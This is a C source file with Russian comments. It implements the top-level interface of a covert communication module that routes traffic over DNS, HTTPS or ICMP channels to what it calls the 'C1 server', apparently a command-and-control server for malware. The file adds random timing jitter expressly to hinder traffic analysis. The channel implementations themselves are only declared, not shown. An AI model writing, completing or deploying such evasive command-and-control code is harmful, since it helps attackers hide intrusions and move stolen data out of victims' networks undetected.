/**
 * @file covert_channel.c
 * @brief Реализация основного интерфейса для модуля скрытых каналов связи
 *
 * @author iamtomasanderson@gmail.com
 * @date 2023-09-03
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>

#ifdef _WIN32
#include <windows.h>
#define sleep_ms(ms) Sleep(ms)
#else
#include <unistd.h>
#define sleep_ms(ms) usleep(ms * 1000)
#endif

#include "covert_channel.h"
#include "https_channel.h"
#include "icmp_channel.h"   // Заголовок для ICMP (предполагаемый путь)

/**
 * @brief Структура данных для хранения состояния скрытого канала связи
 */
typedef struct {
    covert_channel_type channel_type;           ///< Тип канала связи
    encryption_algorithm encryption_type;        ///< Тип шифрования
    covert_channel_config config;                ///< Копия конфигурации
    void *channel_handle;                       ///< Дескриптор конкретного канала (DNS, HTTPS, ICMP)
    unsigned char session_id[16];               ///< Уникальный идентификатор сессии
} CovertChannelData;

// Прототипы внешних функций модулей каналов связи
extern int dns_channel_init(const covert_channel_config *config, void **handle);
extern int dns_channel_connect(void *handle);
extern int dns_channel_send(void *handle, const unsigned char *data, size_t data_len);
extern int dns_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
extern void dns_channel_cleanup(void *handle);

extern int https_channel_init(const covert_channel_config *config, void **handle);
extern int https_channel_connect(void *handle);
extern int https_channel_send(void *handle, const unsigned char *data, size_t data_len);
extern int https_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
extern void https_channel_cleanup(void *handle);
extern bool https_channel_check_connection(void *handle);

extern int icmp_channel_init(const covert_channel_config *config, void **handle);
extern int icmp_channel_connect(void *handle);
extern int icmp_channel_send(void *handle, const unsigned char *data, size_t data_len);
extern int icmp_channel_receive(void *handle, unsigned char *buffer, size_t buffer_size);
extern void icmp_channel_cleanup(void *handle);

/**
 * @brief Генерирует случайный идентификатор сессии
 * 
 * @param session_id Буфер для хранения идентификатора (16 байт)
 */
static void generate_session_id(unsigned char *session_id) {
    if (session_id == NULL) {
        return;
    }
    
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 16; i++) {
        session_id[i] = (unsigned char)(rand() % 256);
    }
}

/**
 * @brief Инициализирует модуль скрытых каналов связи
 * 
 * @param config Указатель на структуру с конфигурацией
 * @return covert_channel_handle Дескриптор канала или NULL при ошибке
 */
covert_channel_handle covert_channel_init(covert_channel_config *config) {
    if (config == NULL) {
        return NULL;
    }
    
    // Выделение памяти для структуры данных канала
    CovertChannelData *channel_data = (CovertChannelData *)malloc(sizeof(CovertChannelData));
    if (channel_data == NULL) {
        return NULL;
    }
    
    // Инициализация структуры
    memset(channel_data, 0, sizeof(CovertChannelData));
    channel_data->channel_type = config->type;
    channel_data->encryption_type = config->encryption;
    memcpy(&channel_data->config, config, sizeof(covert_channel_config));
    
    // Генерация уникального идентификатора сессии
    generate_session_id(channel_data->session_id);
    
    // Инициализация соответствующего канала связи
    int result = -1;
    
    switch (config->type) {
        case COVERT_CHANNEL_DNS:
            result = dns_channel_init(config, &channel_data->channel_handle);
            break;
            
        case COVERT_CHANNEL_HTTPS:
            result = https_channel_init(config, &channel_data->channel_handle);
            break;
            
        case COVERT_CHANNEL_ICMP:
            result = icmp_channel_init(config, &channel_data->channel_handle);
            break;
            
        default:
            // Неизвестный тип канала
            free(channel_data);
            return NULL;
    }
    
    if (result != 0 || channel_data->channel_handle == NULL) {
        free(channel_data);
        return NULL;
    }
    
    return (covert_channel_handle)channel_data;
}

/**
 * @brief Устанавливает соединение с сервером C1
 * 
 * @param handle Дескриптор канала
 * @return bool true при успехе, false при неудаче
 */
bool covert_channel_connect(covert_channel_handle handle) {
    if (handle == NULL) {
        return false;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Вызов соответствующей функции установления соединения
    int result = -1;
    
    switch (channel_data->channel_type) {
        case COVERT_CHANNEL_DNS:
            result = dns_channel_connect(channel_data->channel_handle);
            break;
            
        case COVERT_CHANNEL_HTTPS:
            result = https_channel_connect(channel_data->channel_handle);
            break;
            
        case COVERT_CHANNEL_ICMP:
            result = icmp_channel_connect(channel_data->channel_handle);
            break;
            
        default:
            return false;
    }
    
    return (result == 0);
}

/**
 * @brief Отправляет данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала
 * @param data Указатель на данные для отправки
 * @param data_len Размер данных в байтах
 * @return size_t Количество отправленных байт или 0 при ошибке
 */
size_t covert_channel_send(covert_channel_handle handle, const unsigned char *data, size_t data_len) {
    if (handle == NULL || data == NULL || data_len == 0) {
        return 0;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Добавление случайной задержки (jitter) перед отправкой
    if (channel_data->config.max_jitter_ms > channel_data->config.min_jitter_ms && channel_data->config.min_jitter_ms >= 0) {
        int range = channel_data->config.max_jitter_ms - channel_data->config.min_jitter_ms + 1;
        int jitter_ms = channel_data->config.min_jitter_ms + (rand() % range);
        if (jitter_ms > 0) { // Добавляем проверку, чтобы не вызывать sleep_ms(0)
        sleep_ms(jitter_ms);
        }
    }
    
    // Вызов соответствующей функции отправки данных
    int result = -1;
    
    switch (channel_data->channel_type) {
        case COVERT_CHANNEL_DNS:
            result = dns_channel_send(channel_data->channel_handle, data, data_len);
            break;
            
        case COVERT_CHANNEL_HTTPS:
            result = https_channel_send(channel_data->channel_handle, data, data_len);
            break;
            
        case COVERT_CHANNEL_ICMP:
            result = icmp_channel_send(channel_data->channel_handle, data, data_len);
            break;
            
        default:
            return 0;
    }
    
    return (result > 0) ? (size_t)result : 0;
}

/**
 * @brief Получает данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала
 * @param buffer Буфер для получаемых данных
 * @param buffer_size Размер буфера
 * @return size_t Количество полученных байт или 0 при ошибке
 */
size_t covert_channel_receive(covert_channel_handle handle, unsigned char *buffer, size_t buffer_size) {
    if (handle == NULL || buffer == NULL || buffer_size == 0) {
        return 0;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Добавление случайной задержки (jitter) перед получением
    if (channel_data->config.max_jitter_ms > channel_data->config.min_jitter_ms && channel_data->config.min_jitter_ms >= 0) {
        int range = channel_data->config.max_jitter_ms - channel_data->config.min_jitter_ms + 1;
        int jitter_ms = channel_data->config.min_jitter_ms + (rand() % range);
        if (jitter_ms > 0) { // Добавляем проверку, чтобы не вызывать sleep_ms(0)
        sleep_ms(jitter_ms);
        }
    }
    
    // Вызов соответствующей функции получения данных
    int result = -1;
    
    switch (channel_data->channel_type) {
        case COVERT_CHANNEL_DNS:
            result = dns_channel_receive(channel_data->channel_handle, buffer, buffer_size);
            break;
            
        case COVERT_CHANNEL_HTTPS:
            result = https_channel_receive(channel_data->channel_handle, buffer, buffer_size);
            break;
            
        case COVERT_CHANNEL_ICMP:
            result = icmp_channel_receive(channel_data->channel_handle, buffer, buffer_size);
            break;
            
        default:
            return 0;
    }
    
    return (result > 0) ? (size_t)result : 0;
}

/**
 * @brief Устанавливает параметры временного разброса (jitter) для затруднения анализа трафика
 * 
 * @param handle Дескриптор канала
 * @param min_ms Минимальная задержка в миллисекундах
 * @param max_ms Максимальная задержка в миллисекундах
 */
void covert_channel_set_jitter(covert_channel_handle handle, int min_ms, int max_ms) {
    if (handle == NULL || min_ms < 0 || max_ms < min_ms) {
        return;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Сохраняем значения в конфигурации канала
    channel_data->config.min_jitter_ms = min_ms;
    channel_data->config.max_jitter_ms = max_ms;
    
    // Добавляем логирование в режиме отладки
    #ifdef DEBUG
    fprintf(stderr, "Jitter set: min=%d ms, max=%d ms\n", min_ms, max_ms);
    #endif
}

/**
 * @brief Проверяет, установлено ли соединение
 * 
 * @param handle Дескриптор канала
 * @return bool true если соединение установлено, false в противном случае
 */
bool covert_channel_is_connected(covert_channel_handle handle) {
    if (handle == NULL) {
        return false;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;

    // Проверка зависит от типа канала
    switch (channel_data->channel_type) {
        case COVERT_CHANNEL_HTTPS:
            // Для HTTPS вызываем специальную функцию проверки
            return https_channel_check_connection(channel_data->channel_handle);
        
        case COVERT_CHANNEL_DNS:
        case COVERT_CHANNEL_ICMP:
            // Для DNS и ICMP пока просто проверяем наличие handle
            // TODO: Реализовать более надежную проверку для DNS/ICMP
            return (channel_data->channel_handle != NULL);
            
        default:
            return false;
    }
}

/**
 * @brief Освобождает ресурсы, связанные с каналом связи
 * 
 * @param handle Дескриптор канала
 */
void covert_channel_cleanup(covert_channel_handle handle) {
    if (handle == NULL) {
        return;
    }
    
    CovertChannelData *channel_data = (CovertChannelData *)handle;
    
    // Вызов соответствующей функции очистки ресурсов
    switch (channel_data->channel_type) {
        case COVERT_CHANNEL_DNS:
            dns_channel_cleanup(channel_data->channel_handle);
            break;
            
        case COVERT_CHANNEL_HTTPS:
            https_channel_cleanup(channel_data->channel_handle);
            break;
            
        case COVERT_CHANNEL_ICMP:
            icmp_channel_cleanup(channel_data->channel_handle);
            break;
            
        default:
            break;
    }
    
    // Освобождение памяти структуры данных
    free(channel_data);
} 